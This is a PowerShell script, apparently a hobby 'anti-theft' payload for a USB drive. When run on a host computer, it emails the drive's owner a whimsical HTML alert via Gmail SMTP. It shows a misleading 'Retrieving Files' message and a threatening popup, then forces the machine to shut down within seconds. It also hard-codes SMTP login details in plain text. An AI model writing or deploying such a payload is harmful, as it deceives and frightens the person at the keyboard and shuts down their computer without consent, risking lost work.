# Configuration variables
$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587
$SMTPUsername = "vidheywebsites@gmail.com"
$SMTPPassword = "//password"
$SenderEmail = "vidheywebsites@gmail.com"
$RecipientEmail = "vidhey.bhogadi2003@gmail.com"
$Subject = "Alert From VIDHEY_USB"
$Body = @"
<html>
<head>
	<style type="text/css">
		table{
			background: #FFEEEE;  /* fallback for old browsers */
			background: -webkit-linear-gradient(to right, #DDEFBB, #FFEEEE);  /* Chrome 10-25, Safari 5.1-6 */
			background: linear-gradient(to right, #DDEFBB, #FFEEEE); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */
			}
	</style>
</head>
<body>
    <table style="width:1000px; border-radius:20px;" align="center" border=5 cellpadding="20">
	<tr>
	  	<td style="border:None;"><img src="https://drive.google.com/uc?export=view&id=1_YLOVA6suaUmLCBLnL_Wq2noh5GwuI8G" alt="USB-Image"/></td>
		<td style="border:None;"><h3>Dear Vidhey,<br><br>&nbsp;&nbsp;&nbsp;&nbsp;I have sensed that I am currently being used by someone. It seems that someone else is using me. So I have injected a payload on that device. I kindly request your attention and prompt action to rectify this situation. As your loyal pendrive, I hold valuable data that should remain secure and confidential. Please take the necessary steps to retrieve me and ensure that I am in your possession. Together, we can safeguard your important information and maintain the integrity of our digital partnership.Thank you for your swift action.<p align="right"><br>yours loyal drive,<br>VIDHEY_USB.</p></h3><br></td>
	</tr>
    </table>
</body>
</html>
"@

# Email parameters
$EmailParams = @{
    SmtpServer = $SMTPServer
    Port = $SMTPPort
    UseSsl = $true
    Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $SMTPUsername, (ConvertTo-SecureString -String $SMTPPassword -AsPlainText -Force)
    From = $SenderEmail
    To = $RecipientEmail
    Subject = $Subject
    Body = $Body
    BodyAsHtml = $true
}

Write-Host "Retrieving Files.."
Start-Sleep -Seconds 1
Write-Host "It may take 5 to 10 seconds..."

# Send the email
Send-MailMessage @EmailParams

$popupMessage = "UNAUTHORISED ACCESS TO VIDHEY_USB :(" + [System.Environment]::NewLine + "YOUR DEVICE IS GOING TO STOP WORKING IN 10 SECONDS..!"

$wshell = New-Object -ComObject WScript.Shell
$wshell.Popup($popupMessage, 5, "Danger", 65)

# Shutdown computer
Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5" -NoNewWindow -Wait
